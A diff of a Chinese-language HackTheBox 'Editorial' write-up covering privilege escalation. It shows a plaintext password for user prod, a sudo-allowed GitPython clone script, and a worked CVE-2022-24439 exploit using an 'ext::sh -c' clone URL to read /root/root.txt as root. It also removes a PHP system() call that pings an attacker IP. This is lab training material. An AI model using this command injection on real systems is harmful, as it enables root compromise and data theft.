@@ -138,22 +138,75 @@ dev@editorial:~$
 ```
 
 
-http://editorial.htb/static/uploads/98c1817b-d7c7-4afe-9c42-8c31964ac88b
+# 提权
+
+找到另外一个密码
+
+![](Editorial_files/11.jpg)
 
 
-http://10.10.16.25/1675417209384.jpg
+```prod：080217_Producti0n_2023!@```
 
-http://10.10.16.25/1.txt
+切换用户后，有sudo特权
 
-
-http://10.10.16.25/3.jpg
-
-ping 10.10.16.25 -c 4 
-
+![](Editorial_files/12.jpg)
 
 ```
-<?php
+prod@editorial:/home/dev/apps/app_api$ sudo -l
+Matching Defaults entries for prod on editorial:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
-system("ping 10.10.16.25 -c 4");
+User prod may run the following commands on editorial:
+    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
+prod@editorial:/home/dev/apps/app_api$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
+#!/usr/bin/python3
+
+import os
+import sys
+from git import Repo
+
+os.chdir('/opt/internal_apps/clone_changes')
+
+url_to_clone = sys.argv[1]
+
+r = Repo.init('', bare=True)
+r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
+
+```
+
+根据[CVE-2022-24439](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858?source=post_page-----0fba80ca64e8--------------------------------)
+
+
+利用GitPython，可以把root.txt复制出来
+
+由于用户输入验证不当，这个包的受影响版本容易受到远程代码执行(Remote Code Execution，RCE)的攻击，这使得有可能将恶意制作的远程 URL 注入到克隆命令中。利用这个漏洞是可能的，因为该库在没有对输入参数进行足够清除的情况下对 git 进行外部调用
+
+```
+prod@editorial:~$ echo "" > root.txt
+prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c cat% /root/root.txt% >% /home/prod/root.txt"
+Traceback (most recent call last):
+  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
+    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
+  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
+    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
+    finalize_process(proc, stderr=stderr)
+  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
+    proc.wait(**kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
+    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
+git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
+  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c cat% /root/root.txt% >% /home/prod/root.txt new_changes
+  stderr: 'Cloning into 'new_changes'...
+fatal: Could not read from remote repository.
+
+Please make sure you have the correct access rights
+and the repository exists.
+'
+prod@editorial:~$ ls
+root.txt
+prod@editorial:~$ cat root.txt 
+347b4e4e9fc4e0496157f0d4fd5aedf5
+prod@editorial:~$ 
 
 ```
